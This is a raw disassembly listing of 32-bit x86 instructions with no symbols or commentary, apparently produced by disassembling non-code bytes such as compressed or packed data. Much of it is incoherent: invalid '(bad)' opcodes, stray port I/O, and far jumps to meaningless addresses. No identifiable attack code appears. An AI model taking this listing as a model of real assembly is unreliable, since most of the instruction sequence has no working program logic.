  4179eb:	stos   DWORD PTR es:[edi],eax
  4179ec:	in     al,0x20
  4179ee:	mov    eax,0x94321258
  4179f3:	pop    ebp
  4179f4:	inc    edx
  4179f5:	imul   edi,DWORD PTR [edi+ebx*2+0x30c136bc],0x10
  4179fd:	or     DWORD PTR [edi],ecx
  4179ff:	or     eax,0x8bc9e4b7
  417a04:	in     al,dx
  417a05:	adc    al,0x5a
  417a07:	push   edi
  417a08:	adc    al,0x5a
  417a0a:	jo     0x417a65
  417a0c:	sub    cl,bh
  417a0e:	jmp    FWORD PTR [ebx+0x6944450a]
  417a14:	jbe    0x417a58
  417a16:	jns    0x417a72
  417a18:	gs jb  0x417a8a
  417a1b:	nop
  417a1c:	ins    BYTE PTR es:[edi],dx
  417a1d:	cld    
  417a1e:	inc    edx
  417a1f:	and    BYTE PTR [esp+ebp*2-0x41],ah
  417a23:	push   edx
  417a24:	popa   
  417a25:	outs   dx,BYTE PTR ds:[esi]
  417a26:	adc    BYTE PTR gs:[bp+si],dh
  417a2a:	xchg   esp,eax
  417a2b:	(bad)  
  417a2c:	les    edx,FWORD PTR [edi-0x3c]
  417a2f:	push   DWORD PTR ss:[edx+0x23]
  417a33:	jae    0x417a7e
  417a35:	outs   dx,BYTE PTR ds:[esi]
  417a36:	jbe    0x417a9d
  417a38:	jb     0x417aa0
  417a3a:	ins    BYTE PTR es:[edi],dx
  417a3b:	outs   dx,DWORD PTR ds:[esi]
  417a3c:	ja     0x417a5e
  417a3e:	pop    ebx
  417a3f:	push   esi
  417a40:	and    BYTE PTR [edi],ch
  417a42:	adc    ah,BYTE PTR [ebx+0x20]
  417a45:	pop    ebx
  417a46:	in     al,dx
  417a47:	pop    eax
  417a48:	or     DWORD PTR [esi],edx
  417a4a:	or     ecx,DWORD PTR [ebp+0x22]
  417a4d:	mov    dl,0x90
  417a4f:	js     0x417aa8
  417a51:	push   ebp
  417a52:	bnd jnp 0x4179f6
  417a55:	pop    ds
  417a56:	mov    bl,0xd4
  417a58:	pop    edx
  417a59:	sub    bl,bh
  417a5b:	sbb    ecx,ebp
  417a5d:	or     dh,BYTE PTR [esi+0x18]
  417a60:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x8757d090
  417a68:	inc    edx
  417a69:	and    BYTE PTR [eax+edx*8+0x63],ah
  417a6d:	mov    dh,0xbc
  417a6f:	enter  0xcde,0xbf
  417a73:	pop    ecx
  417a74:	sub    BYTE PTR gs:[edi+edx*2+0x28],bl
  417a79:	pop    esp
  417a7a:	xchg   al,dl
  417a7c:	pop    eax
  417a7d:	sub    DWORD PTR [ebx+0x60],0x225650bc
  417a84:	xlat   BYTE PTR ds:[ebx]
  417a85:	push   edi
  417a86:	pop    ds
  417a87:	in     al,dx
  417a88:	fst    DWORD PTR [edi+0x20]
  417a8b:	pop    es
  417a8c:	push   ebp
  417a8d:	outs   dx,BYTE PTR ds:[esi]
  417a8e:	fs pop eax
  417a90:	nop
  417a91:	fcom   DWORD PTR [edi-0x72]
  417a94:	sar    BYTE PTR [edx-0x5f],0x1f
  417a98:	xchg   DWORD PTR [edi],ecx
  417a9a:	enter  0xfd36,0x10
  417a9e:	pop    edi
  417a9f:	push   eax
  417aa0:	outs   dx,DWORD PTR ds:[esi]
  417aa1:	imul   ebp,DWORD PTR [esi-0x7c],0x365b5d34
  417aa8:	add    al,0xd6
  417aaa:	mov    bh,0x1f
  417aac:	or     al,0x2f
  417aae:	or     al,0x5b
  417ab0:	xchg   BYTE PTR [edx+0x61431f8e],dh
  417ab6:	jae    0x417b2c
  417ab8:	outs   dx,DWORD PTR ds:[esi]
  417ab9:	nop
  417aba:	pop    ebx
  417abb:	nop
  417abc:	or     al,0xad
  417abe:	pop    es
  417abf:	inc    edx
  417ac0:	or     eax,0x69254345
  417ac5:	js     0x417a68
  417ac7:	in     al,dx
  417ac8:	nop
  417ac9:	xlat   BYTE PTR ds:[ebx]
  417aca:	in     al,dx
  417acb:	pop    ebx
  417acc:	pop    ds
  417acd:	cmc    
  417ace:	(bad)  
  417acf:	pop    eax
  417ad1:	retf   
  417ad2:	adc    BYTE PTR [ebp+0x41],al
  417ad5:	arpl   WORD PTR [edi-0x76a98c8d],ax
  417adb:	idiv   DWORD PTR fs:[edx-0x729e9378]
  417ae2:	mov    ebx,0x71d5e4c
  417ae7:	inc    edx
  417ae8:	jp     0x417b09
  417aea:	sub    edx,DWORD PTR [eax+0x72]
  417aed:	js     0x417b5b
  417aef:	and    DWORD PTR [ebx-0x27],eax
  417af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af3:	gs jecxz 0x417a86
  417af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af7:	push   edi
  417af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af9:	ret    
  417afa:	clc    
  417afb:	or     eax,0x7453af02
  417b00:	popa   
  417b01:	arpl   WORD PTR [ebx-0x80],bp
  417b04:	test   BYTE PTR [eax+ecx*2+0x5f0090e0],bh
  417b0b:	inc    ebx
  417b0c:	add    BYTE PTR [edi+0x2d],bl
  417b0f:	pop    esp
  417b10:	push   0x6a746f18
  417b15:	ins    BYTE PTR es:[edi],dx
  417b16:	inc    ebx
  417b17:	imul   ebx,DWORD PTR [eax+0x15],0x8
  417b1b:	das    
  417b1c:	xchg   esp,eax
  417b1d:	push   edi
  417b1e:	pop    ds
  417b1f:	(bad)  
  417b20:	mov    dl,0x49
  417b22:	pusha  
  417b23:	loope  0x417b7b
  417b25:	popa   
  417b26:	or     al,0x61
  417b28:	lahf   
  417b29:	mov    ah,0x5b
  417b2b:	xor    BYTE PTR [edx+eax*2],al
  417b2e:	xchg   BYTE PTR [edi+eax*8+0x51c1b0d0],dh
  417b35:	les    esp,FWORD PTR [edx]
  417b37:	rol    DWORD PTR [esi+0x61],0x6e
  417b3b:	fs add eax,0xc7db22f2
  417b41:	adc    al,0x60
  417b43:	pop    edi
  417b44:	adc    al,0x60
  417b46:	mov    bl,0xc2
  417b48:	(bad)  
  417b49:	jb     0x417b59
  417b4b:	(bad)  
  417b4c:	fdiv   DWORD PTR [edx+0x72]
  417b4f:	mov    esp,0xd9432112
  417b54:	nop
  417b55:	jo     0x417bb2
  417b57:	jo     0x417b7e
  417b59:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417b5b:	push   es
  417b5c:	stos   DWORD PTR es:[edi],eax
  417b5d:	data16 cmp BYTE PTR [ebx-0x34],bl
  417b61:	xchg   edi,eax
  417b62:	or     BYTE PTR [esp+ecx*1+0x61536fcc],al
  417b69:	hlt    
  417b6a:	mov    ebx,0x6566f901
  417b6f:	arpl   WORD PTR [ecx+0x6c],sp
  417b72:	in     al,0x3f
  417b74:	adc    DWORD PTR [ebx],eax
  417b76:	cs aaa 
  417b78:	xor    al,0x4
  417b7a:	add    eax,0x5620d831
  417b7f:	dec    eax
  417b80:	pop    es
  417b81:	or     BYTE PTR [edx],dh
  417b83:	jbe    0x417b66
  417b85:	mov    dh,0x81
  417b87:	push   ebp
  417b88:	and    ch,BYTE PTR [ebx+esi*2-0x65]
  417b8c:	or     BYTE PTR [ecx+0x23],ah
  417b8f:	cmp    BYTE PTR [edi],cl
  417b91:	cmp    DWORD PTR [eax+0x24993f41],ecx
  417b97:	mov    edi,0xa3118c11
  417b9c:	push   ebx
  417b9d:	ds ret 0xeac1
  417ba1:	adc    BYTE PTR [esi-0x20],ah
  417ba4:	add    BYTE PTR [edi+edi*8-0x9],ch
  417ba8:	repz mov ebx,DWORD PTR [ebp+0x8]
  417bac:	mov    WORD PTR [ecx],ax
  417baf:	add    dl,BYTE PTR [ebx]
  417bb1:	cli    
  417bb2:	cld    
  417bb3:	into   
  417bb4:	adc    BYTE PTR [edi],cl
  417bb6:	inc    eax
  417bb7:	xchg   DWORD PTR [edi],eax
  417bb9:	retf   
  417bba:	mov    dl,0x1
  417bbc:	mov    eax,ds:0x3aa95d44
  417bc1:	loop   0x417bca
  417bc3:	mov    ecx,0x20989487
  417bc8:	add    DWORD PTR [si+0x1],esi
  417bcc:	or     al,0xd0
  417bce:	cli    
  417bcf:	sbb    BYTE PTR [edx-0x30],dl
  417bd2:	sahf   
  417bd3:	gs test BYTE PTR cs:0xeaa181c6,ch
  417bdb:	or     dh,bl
  417bdd:	pop    es
  417bde:	out    0xbf,eax
  417be0:	icebp  
  417be1:	inc    esi
  417be2:	sub    eax,0x8a7f21a4
  417be7:	add    BYTE PTR [edi+eax*2],bh
  417bea:	push   es
  417beb:	cmp    al,0x7a
  417bed:	ja     0x417bf1
  417bef:	jb     0x417bcc
  417bf1:	dec    ebp
  417bf2:	aad    0x2c
  417bf4:	and    BYTE PTR [ebp+0x14ff0288],al
  417bfa:	call   FWORD PTR [edi]
  417bfc:	test   DWORD PTR [ebp+0x75e42de8],ebx
  417c02:	fistp  WORD PTR [ecx-0x45]
  417c05:	dec    edi
  417c06:	push   edx
  417c07:	enter  0xcd2,0x41
  417c0b:	pop    edx
  417c0c:	add    al,0x18
  417c0e:	mov    ds:0x9420846,eax
  417c13:	in     eax,dx
  417c14:	or     DWORD PTR [edi-0x5cdee080],edx
  417c1a:	mov    ecx,eax
  417c1c:	cmp    ecx,edx
  417c1e:	jbe    0x417c6d
  417c20:	cmp    ecx,ecx
  417c22:	or     BYTE PTR fs:[esi-0x1],ch
  417c26:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c28:	je     0x417c32
  417c2a:	movzx  eax,BYTE PTR [esi-0x1]
  417c2e:	add    edx,DWORD PTR [edi-0x1]
  417c31:	mov    cs,WORD PTR ss:0xf0835cf6
  417c38:	jnp    0x417c8a
  417c3a:	pop    es
  417c3b:	das    
  417c3c:	rol    BYTE PTR [eax+0x4c],1
  417c3f:	push   es
  417c40:	pop    ebx
  417c41:	ret    
  417c42:	movnti DWORD PTR [ebp-0x17cf989e],esp
  417c49:	pusha  
  417c4a:	or     al,0x43
  417c4c:	sub    al,0x5b
  417c4e:	xor    ebp,DWORD PTR [edx+0x58c74121]
  417c54:	adc    BYTE PTR [eax],ah
  417c56:	outs   dx,BYTE PTR ds:[esi]
  417c57:	rcl    BYTE PTR [edx+0x40],1
  417c5a:	add    al,0x94
  417c5c:	rcl    bl,0x2f
  417c5f:	jmp    0xc7d1:0x8beaf6d9
  417c66:	int    0xf0
  417c68:	mov    ebx,0xfb7c409a
  417c6d:	inc    DWORD PTR [ecx]
  417c6f:	inc    ebx
  417c70:	cmp    esi,ebx
  417c72:	jl     0x417c7b
  417c74:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  417c79:	jbe    0x417c6f
  417c7b:	or     bh,BYTE PTR [ebp+0xa]
  417c7e:	mov    eax,ebp
  417c80:	imul   BYTE PTR [ebp+0x175a8ed9]
  417c86:	dec    esi
  417c87:	adc    al,0x37
  417c89:	clc    
  417c8a:	xor    eax,0x41cb2bce
  417c8f:	stc    
  417c90:	pop    eax
  417c91:	adc    al,ah
  417c93:	mov    cl,0x38
  417c95:	xor    BYTE PTR [eax],ch
  417c97:	dec    ebx
  417c98:	iret   
  417c99:	xor    ebx,DWORD PTR [ecx+0x40]
  417c9c:	sbb    al,0x4c
  417c9e:	ret    
  417c9f:	push   ds
  417ca0:	push   edi
  417ca1:	in     al,dx
  417ca2:	inc    ebp
  417ca3:	mov    edx,0x7fddb986
  417ca8:	aaa    
  417ca9:	(bad)  
  417caa:	ror    DWORD PTR ss:[esi],cl
  417cad:	cmc    
  417cae:	stos   BYTE PTR es:[edi],al
  417caf:	ss adc al,0xcb
  417cb2:	cmp    eax,0x1c05bb5b
  417cb7:	pop    eax
  417cb8:	adc    BYTE PTR [esp+ebx*1+0xd],bh
  417cbc:	cmp    BYTE PTR [eax],bl
  417cbe:	cmova  edi,DWORD PTR [eax-0x9]
  417cc2:	jmp    DWORD PTR [edi]
  417cc4:	jne    0x417cd4
  417cc6:	mov    ebx,0x6374b8cb
  417ccb:	loop   0x417cfd
  417ccd:	push   0xd886e442
  417cd2:	bound  edi,QWORD PTR [edi+0x36ff0e68]
  417cd8:	push   es
  417cd9:	ds mov edx,0xc30e6fd9
  417cdf:	jge    0x417ce0
  417ce1:	inc    esp
  417ce2:	push   ebx
  417ce3:	inc    ebx
  417ce4:	daa    
  417ce5:	or     cl,cl
  417ce7:	jne    0x417d00
  417ce9:	dec    DWORD PTR ds:0x79610bc0
  417cef:	push   cs
  417cf0:	mul    DWORD PTR [edx+0x2db08a53]
  417cf6:	inc    ecx
  417cf7:	dec    esi
  417cf8:	mov    BYTE PTR [esi],al
  417cfa:	ret    
  417cfb:	mov    eax,ds:0xb98a1bf8
  417d00:	mov    edx,DWORD PTR [edx+0x56]
  417d03:	xor    edx,edx
  417d05:	div    ecx
  417d07:	dec    esi
  417d08:	mov    ds:0x7a897d00,eax
  417d0d:	cmp    dl,0x3a
  417d10:	and    edx,eax
  417d12:	pop    es
  417d13:	mov    BYTE PTR [esi],dl
  417d15:	(bad)  
  417d16:	(bad)  
  417d17:	mov    edi,0x9cea82b0
  417d1c:	sub    ecx,esi
  417d1e:	sub    edx,ecx
  417d20:	jbe    0x417d32
  417d22:	add    ecx,edx
  417d24:	mov    al,0x30
  417d26:	sub    esi,edx
  417d28:	jmp    0x417d2d
  417d2a:	mov    BYTE PTR [edx+esi*1],al
  417d2d:	dec    edx
  417d2e:	jne    0x417d2a
  417d30:	loop   0x417d91
  417d32:	sti    
  417d33:	out    dx,eax
  417d34:	xor    eax,0x83e68956
  417d39:	in     al,dx
  417d3a:	adc    BYTE PTR [ecx],dh
  417d3c:	leave  
  417d3d:	push   edx
  417d3e:	aaa    
  417d3f:	dec    esp
  417d40:	je     0x417ccb
  417d42:	repnz pop eax
  417d44:	sub    DWORD PTR [edx],ebp
  417d46:	add    eax,0xf6dd59c
  417d4b:	shr    DWORD PTR [edx],1
  417d4d:	(bad)  
  417d4e:	(bad)  [ebx+0x30]
  417d51:	pop    ecx
  417d52:	pusha  
  417d53:	or     dh,bl
  417d55:	jmp    0x470:0xff22851f
  417d5c:	in     al,0x89
  417d5e:	loopne 0x417d57
  417d60:	aas    
  417d61:	push   0x73
  417d63:	xchg   esp,eax
  417d64:	inc    esi
  417d65:	add    edx,DWORD PTR [edi]
  417d67:	pop    esp
  417d68:	sti    
  417d69:	push   esp
  417d6a:	adc    al,0x6b
  417d6c:	sub    eax,0xd6c685e8
  417d71:	sub    eax,0x530b414e
  417d76:	push   ecx
  417d77:	(bad)  
  417d79:	clc    
  417d7a:	jg     0x417d80
  417d7c:	fnstcw WORD PTR [esp+0x2]
  417d80:	fnstcw WORD PTR [esp]
  417d83:	or     WORD PTR [esi*8+0x82cd90f],0xd089
  417d8d:	mov    ds,WORD PTR [esi+esi*2]
  417d90:	fld1   
  417d92:	inc    esp
  417d93:	daa    
  417d94:	and    DWORD PTR [edx+edi*1-0x9],0x3cf61fed
  417d9c:	push   0x6cdfff04
  417da1:	and    al,0x8
  417da3:	fild   QWORD PTR [eax+ebx*8]
  417da6:	ret    0xc1de
  417da9:	sub    BYTE PTR [edx-0x14812049],0x2
  417db0:	fild   QWORD PTR [eax]
  417db2:	fild   WORD PTR [esi+esi*1]
  417db5:	ror    DWORD PTR [esi-0x27],0xf8
  417db9:	fild   QWORD PTR [esi-0x24]
  417dbc:	stc    
  417dbd:	mov    ch,BYTE PTR [edi+0x5b]
  417dc0:	mov    ds:0x3c30675d,eax
  417dc5:	xlat   BYTE PTR ds:[ebx]
  417dc6:	jg     0x417d9e
  417dc8:	push   es
  417dc9:	push   ss
  417dca:	fcom   st(3)
  417dcc:	fwait
  417dcd:	call   DWORD PTR [esi]
  417dcf:	mov    ah,0xfd
  417dd1:	fnstsw ax
  417dd3:	sahf   
  417dd4:	jae    0x417db7
  417dd6:	fnstenv ds:0xc3dd6b02
  417ddc:	ffree  st(2)
  417dde:	ffree  st(1)
  417de0:	frstor [edx-0x37]
  417de3:	in     eax,0xd9
  417de5:	rcr    BYTE PTR [ecx-0x16],0x29
  417de9:	(bad)  
  417dea:	add    ecx,edx
  417dec:	push   edi
  417ded:	mov    cl,0x8c
  417def:	mov    ebp,0x5020ee93
  417df4:	xchg   ebx,eax
  417df5:	add    dh,al
  417df7:	and    eax,0xe0f1085f
  417dfc:	and    BYTE PTR [esi+0x5d],bl
  417dff:	stos   BYTE PTR es:[edi],al
  417e00:	imul   ecx,DWORD PTR [ebx],0x26
  417e03:	or     bl,0xd7
  417e06:	add    ah,BYTE PTR [eax]
  417e08:	sub    eax,DWORD PTR [ebx]
  417e0a:	stc    
  417e0b:	push   ds
  417e0c:	cmp    al,0x51
  417e0e:	mov    ecx,0x2b74290e
  417e13:	sbb    al,BYTE PTR [edx-0x2b59e4e8]
  417e19:	test   al,0x16
  417e1b:	adc    BYTE PTR [edi-0x40],0x51
  417e1f:	(bad)  
  417e20:	pop    edx
  417e21:	jbe    0x417e8a
  417e23:	mov    WORD PTR [ebx-0x2b63ae5d],ss
  417e29:	sbb    al,0x89
  417e2b:	push   es
  417e2c:	ds sub eax,eax
  417e2f:	icebp  
  417e30:	push   ds
  417e31:	mov    al,ds:0x780a15f
  417e36:	sbb    ecx,DWORD PTR [ebx-0xf]
  417e39:	sub    DWORD PTR [eax+0x292f2837],edx
  417e3f:	fstp   TBYTE PTR [eax+0x7821c446]
  417e45:	setno  BYTE PTR [ebx+0x31]
  417e49:	xlat   BYTE PTR ds:[ebx]
  417e4a:	inc    eax
  417e4b:	scas   al,BYTE PTR es:[edi]
  417e4c:	jae    0x417eb5
  417e4e:	add    al,0xd0
  417e50:	daa    
  417e51:	sbb    DWORD PTR [edx-0x4f4510e3],esi
  417e57:	adc    DWORD PTR gs:[edi-0x5f],eax
  417e5b:	test   BYTE PTR [esi],dh
  417e5d:	test   al,cl
  417e5f:	xor    esp,DWORD PTR [eax]
  417e61:	das    
  417e62:	add    al,0x61
  417e64:	test   al,al
  417e66:	aam    0x65
  417e68:	mov    WORD PTR [edx-0x41],fs
  417e6b:	add    al,0x54
  417e6d:	jb     0x417ed9
  417e6f:	pusha  
  417e70:	mov    esi,0x50f0308
  417e75:	add    bl,bl
  417e77:	inc    edi
  417e78:	stos   BYTE PTR es:[edi],al
  417e79:	xlat   BYTE PTR ds:[ebx]
  417e7a:	popf   
  417e7b:	adc    BYTE PTR [edi-0xba39a9],bh
  417e81:	dec    ecx
  417e82:	repnz lds esp,FWORD PTR [esi-0x97a047e]
  417e89:	jl     0x417eab
  417e8b:	inc    esi
  417e8c:	mov    esp,0x138bc01d
  417e91:	sub    edi,DWORD PTR [eax+0x52c66e5b]
  417e97:	js     0x417e9f
  417e99:	sbb    eax,0x1e06eb01
  417e9e:	loopne 0x417ee4
  417ea0:	mov    ?,esi
  417ea2:	jecxz  0x417e2e
  417ea4:	or     esp,edi
  417ea6:	pop    ss
  417ea7:	pusha  
  417ea8:	mov    DWORD PTR [esi],eax
  417eaa:	and    edi,edi
  417eac:	fimul  DWORD PTR [edx]
  417eae:	(bad)  
  417eaf:	std    
  417eb0:	pop    ss
  417eb1:	inc    eax
  417eb2:	and    DWORD PTR [ecx-0x16],ecx
  417eb5:	gs pusha 
  417eb7:	mov    edx,eax
  417eb9:	test   BYTE PTR [ebp+0x43],bh
  417ebc:	sti    
  417ebd:	das    
  417ebe:	sti    
  417ebf:	adc    ebx,ebx
  417ec1:	ins    DWORD PTR es:[edi],dx
  417ec2:	lock fcomp DWORD PTR ds:0xa6886684
  417ec9:	setne  BYTE PTR [ebx]
  417ecc:	jmp    0x417f17
  417ece:	packssdw mm2,QWORD PTR [ebx+0x34551bdd]
  417ed5:	push   ebp
  417ed6:	push   DWORD PTR [eax]
  417ed8:	or     edx,DWORD PTR es:[ebp-0x3c]
  417edc:	inc    eax
  417edd:	mov    dh,0xed
  417edf:	mov    cl,0x59
  417ee1:	xor    eax,DWORD PTR ds:0x216603c6
  417ee7:	and    al,BYTE PTR [ecx+edx*8-0x7b9bd1aa]
  417eee:	add    esp,DWORD PTR [edi-0x3c653e3e]
  417ef4:	xor    cx,di
  417ef7:	add    DWORD PTR [eax],esi
  417ef9:	or     ebx,DWORD PTR [ebp+0x69]
  417efc:	sub    bl,BYTE PTR [ebx-0x78ced2fe]
  417f02:	icebp  
  417f03:	xor    DWORD PTR [edi+ebp*4],ebp
  417f06:	imul   ebp,DWORD PTR [ebx+0x118b7762],0xb0711594
  417f10:	in     al,0x3b
  417f12:	ret    0x128b
  417f15:	sbb    ebp,ebx
  417f17:	and    al,0x10
  417f19:	test   BYTE PTR [edx+0x633fa5f0],al
  417f1f:	(bad)  
  417f20:	xor    edx,edx
  417f22:	mov    cl,dh
  417f24:	adc    al,0x95
  417f26:	sub    al,0xf1
  417f28:	inc    ecx
  417f29:	pop    edi
  417f2a:	ret    
  417f2b:	push   0xffffffb1
  417f2d:	push   edi
  417f2e:	dec    eax
  417f2f:	mov    WORD PTR [ebp+0xd602b74],es
  417f35:	add    cl,BYTE PTR [ebx-0x48b42af]
  417f3b:	fwait
  417f3c:	sbb    BYTE PTR [ecx+0x7effb621],0x29
  417f43:	mov    bl,BYTE PTR [esi+edi*1-0x1]
  417f47:	jae    0x417f1a
  417f49:	inc    ebx
  417f4a:	sub    DWORD PTR [ebx+0x595a1b1c],0x48d8ffb7
  417f54:	mov    ds:0x4c8f2ed7,eax
  417f59:	cmp    al,0x2
  417f5b:	jne    0x417f63
  417f5d:	dec    edi
  417f5e:	dec    edi
  417f5f:	sub    BYTE PTR [edi-0x29],bh
  417f62:	mov    dh,0x59
  417f64:	daa    
  417f65:	add    BYTE PTR [esi-0x70],al
  417f68:	imul   ecx,DWORD PTR [esi-0x2d],0xffffffeb
  417f6c:	pop    ss
  417f6d:	(bad)  
  417f6e:	push   ss
  417f6f:	fldenv [edi+0x7a]
  417f72:	push   esi
  417f73:	xor    al,0x57
  417f76:	lea    edx,[esi+0x1]
  417f79:	bound  edi,QWORD PTR ds:0xc33ac960
  417f7f:	pusha  
  417f80:	out    0x5c,eax
  417f82:	cmp    al,BYTE PTR [eax]
  417f84:	or     DWORD PTR [eax-0xa],0xb8d6a364
  417f8b:	int3   
  417f8c:	aaa    
  417f8d:	push   esi
  417f8e:	lds    esp,FWORD PTR [ecx]
  417f90:	stc    
  417f91:	stos   DWORD PTR es:[edi],eax
  417f92:	sbb    BYTE PTR [edx-0x14ee8ad2],ah
  417f98:	pop    es
  417f99:	pop    esp
  417f9a:	repz mov ebp,0x474a5719
  417fa0:	add    ebp,DWORD PTR [esi]
  417fa2:	dec    eax
  417fa3:	sub    esi,DWORD PTR [eax]
  417fa5:	int3   
  417fa6:	add    dh,BYTE PTR [ebx-0x6]
  417fa9:	(bad)  
  417fab:	or     esi,DWORD PTR [eax-0x6c]
  417fae:	imul   edx,DWORD PTR ds:0x35449a85,0xffffffa0
  417fb5:	push   eax
  417fb6:	mov    ebx,0x71fe14cb
  417fbb:	nop
  417fbc:	cld    
  417fbd:	inc    ebx
  417fbe:	ins    BYTE PTR es:[edi],dx
  417fbf:	es cld 
  417fc1:	imul   DWORD PTR [ebp-0x8]
  417fc4:	xor    BYTE PTR [edx-0x7f],bl
  417fc7:	rol    BYTE PTR [eax*8-0x26bcdbdd],0x5a
  417fcf:	aam    0xa
  417fd1:	jns    0x417fdf
  417fd3:	mov    edi,DWORD PTR [ebp-0xf90fea4]
  417fd9:	add    al,0x8b
  417fdb:	dec    ebp
  417fdc:	inc    ebp
  417fdd:	add    DWORD PTR [ecx-0x1fd805af],ecx
  417fe3:	fs retf 0x1019
  417fe7:	ret    
  417fe8:	inc    edi
  417fe9:	fld    DWORD PTR ds:0xdd10942c
  417fef:	xor    edi,edi
  417ff1:	sbb    ah,BYTE PTR [eax]
  417ff3:	sub    BYTE PTR [esi+0xb],bh
  417ff6:	inc    ebp
  417ff7:	inc    esp
  417ff8:	(bad)  
  417ff9:	mov    dh,0xff
  417ffb:	xor    dh,dl
  417ffd:	push   es
  417ffe:	(bad)  
  417fff:	fiadd  DWORD PTR [ebx]
  418001:	mov    eax,0x89c82f2d
  418006:	xlat   BYTE PTR ds:[ebx]
  418007:	push   0x17b09ef8
  41800c:	lea    eax,[edi-0x1]
  41800f:	adc    edx,DWORD PTR [ecx+0x70]
  418012:	xchg   edx,eax
  418013:	xor    eax,0xf609168a
  418018:	or     BYTE PTR [ebx+0x11a001ed],dh
  41801e:	(bad)  
  41801f:	fmul   st(3),st
  418021:	and    edi,DWORD PTR [edi+0x69012c44]
  418027:	add    eax,0x294101be
  41802c:	retf   
  41802d:	mov    DWORD PTR [eax],eax
  41802f:	xchg   esp,eax
  418030:	test   al,0xee
  418032:	test   DWORD PTR [ecx+0x7fd93dd6],0x2cea25e9
  41803c:	jmp    0x5e9d011a
  418041:	pop    edi
  418042:	xchg   ebx,eax
  418043:	sub    ecx,ebx
  418045:	retf   
  418046:	fbstp  TBYTE PTR [ebx]
  418048:	xlat   BYTE PTR ds:[ebx]
  418049:	mov    esi,eax
  41804b:	xor    eax,eax
  41804d:	or     DWORD PTR [edi],ebp
  41804f:	xor    dh,dl
  418051:	push   cs
  418052:	pop    edx
  418053:	lods   eax,DWORD PTR ds:[esi]
  418054:	fst    DWORD PTR [ecx]
  418056:	add    eax,0xda8a21b2
  41805b:	add    cl,BYTE PTR ds:0x8a49892e
  418061:	mov    edx,0x5cb835b
  418066:	mov    dh,0xd
  418068:	or     BYTE PTR [eax+0x7a],ah
  41806b:	ja     0x418057
  41806d:	and    bh,al
  41806f:	imul   edx,DWORD PTR ds:0xdb7477b4,0x44
  418076:	mov    bl,0xa6
  418078:	shl    BYTE PTR [eax-0x9],cl
  41807b:	mov    BYTE PTR [eax-0x15],bh
  41807e:	or     al,0x84
  418080:	js     0x41808b
  418082:	or     bh,bh
  418084:	(bad)  
  418085:	mov    esi,0x347dab44
  41808a:	cmp    dl,al
  41808c:	jne    0x41807a
  41808e:	pop    es
  41808f:	xchg   edi,eax
  418090:	mov    ds:0x1862689a,al
  418095:	inc    esp
  418096:	adc    eax,0xb16ffd40
  41809b:	out    0xf,al
  41809d:	popf   
  41809e:	enter  0xf76a,0xd1
  4180a2:	dec    ecx
  4180a3:	je     0x4180d3
  4180a5:	mov    esi,ecx
  4180a7:	mov    edi,ebx
  4180a9:	(bad)  [esi-0x49]
  4180ac:	xchg   edx,eax
  4180ad:	xadd   DWORD PTR [esi+0x1d],esi
  4180b1:	push   cs
  4180b2:	lea    ebx,[esi-0x22]
  4180b5:	(bad)  
  4180b6:	lods   al,BYTE PTR ds:[esi]
  4180b7:	mov    DWORD PTR [esi],edx
  4180b9:	rcr    esi,1
  4180bb:	mov    esi,0x57c88911
  4180c0:	lea    edi,[ecx+ecx*2-0x7e]
  4180c4:	cmp    DWORD PTR [edx],ecx
  4180c6:	ja     0x41813d
  4180c8:	in     eax,dx
  4180c9:	hlt    
  4180ca:	adc    eax,0x622be0b7
  4180cf:	and    al,0xbf
  4180d1:	fadd   st,st(5)
  4180d3:	clc    
  4180d4:	jge    0x41809c
  4180d6:	scas   eax,DWORD PTR es:[edi]
  4180d7:	fistp  WORD PTR [edi+0x1f]
  4180da:	jbe    0x4180e1
  4180dc:	mov    ebx,0x4ad3101f
  4180e1:	gs jo  0x418120
  4180e4:	add    DWORD PTR [edi-0x343e600],edi
  4180ea:	dec    ebx
  4180eb:	mov    eax,esp
  4180ed:	push   0x14
  4180ef:	pop    eax
  4180f0:	test   dl,ah
  4180f2:	mov    dh,0x89
  4180f4:	in     eax,dx
  4180f5:	mov    BYTE PTR [esp+ebx*1],0x1d
  4180f9:	(bad)  
  4180fa:	aam    0x20
  4180fc:	mov    BYTE PTR [ebx],0x24
  4180ff:	push   es
  418100:	add    al,bh
  418102:	test   DWORD PTR ds:0xbd342078,esp
  418108:	xor    al,0xea
  41810a:	icebp  
  41810b:	xor    ebp,DWORD PTR [eax+0x1f]
  41810e:	or     eax,0xc34d4c51
  418113:	mov    ecx,DWORD PTR ds:0xf7fcf4f8
  418119:	(bad)  
  41811a:	push   es
  41811b:	push   cs
  41811c:	cmp    esi,edx
  41811e:	or     al,0x8b
  418120:	sbb    eax,0xff1b8b0a
  418125:	rcr    DWORD PTR [ebx+0x49],cl
  418128:	mov    cl,0x82
  41812a:	inc    eax
  41812b:	or     eax,edi
  41812d:	adc    ebp,edx
  41812f:	dec    ecx
  418130:	add    al,0x8f
  418132:	dec    ecx
  418133:	mov    bl,0x94
  418135:	push   ebx
  418136:	push   esi
  418137:	xor    BYTE PTR [ecx],dl
  418139:	cmp    DWORD PTR cs:[eax],ecx
  41813c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41813d:	iret   
  41813e:	lock ss je 0x4180f7
  418142:	mov    ds:0x7de60313,eax
  418147:	clc    
  418148:	or     dh,BYTE PTR [ebp+eiz*1-0x40]
  41814c:	adc    eax,0xdfd17cf
  418151:	add    eax,0x8b54be96
  418156:	or     DWORD PTR [esp+edi*1-0x6655f3db],ebp
  41815d:	je     0x4180f6
  41815f:	mov    ds:0xf889f3f1,al
  418164:	sub    edx,DWORD PTR [edi+0x1d]
  418167:	pop    ebp
  418168:	outs   dx,DWORD PTR ds:[esi]
  418169:	push   ss
  41816a:	repnz in eax,dx
  41816c:	(bad)  
  41816d:	fcomi  st,st(6)
  41816f:	jmp    0xe888806c
  418174:	mov    BYTE PTR [ebp-0x19],al
  418177:	cmp    al,0x2d
  418179:	jne    0x418180
  41817b:	adc    eax,0x6ddeacdc
  418180:	pop    ss
  418181:	fsub   DWORD PTR [ebp+0x5a]
  418184:	jmp    0x10f4:0x170a75f9
  41818b:	retf   
  41818c:	lods   al,BYTE PTR ds:[esi]
  41818d:	jmp    0x418170
  41818f:	dec    ecx
